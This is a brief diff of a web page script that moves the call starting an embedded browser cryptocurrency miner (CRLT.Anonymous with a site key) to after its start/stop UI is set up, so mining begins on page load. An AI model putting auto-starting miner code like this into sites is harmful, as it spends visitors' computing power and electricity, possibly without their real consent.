@@ -60,7 +60,7 @@ try {
                 var threads = 1;
             }
   miner = new CRLT.Anonymous('93f2b499059e36dd47dc89b9dbef7c329283c1e1f77e', {threads: threads,autoThreads:false, throttle:0.5});
-  miner.start();
+  
 } catch(e) {}
 
 var ui = new MinerUI(miner, {
@@ -76,6 +76,7 @@ var ui = new MinerUI(miner, {
   stopButton: document.getElementById('mining-stop'),
   blkWarn: document.getElementById('blk-warning')
 });
+  miner.start();
 </script>
 
   </body>
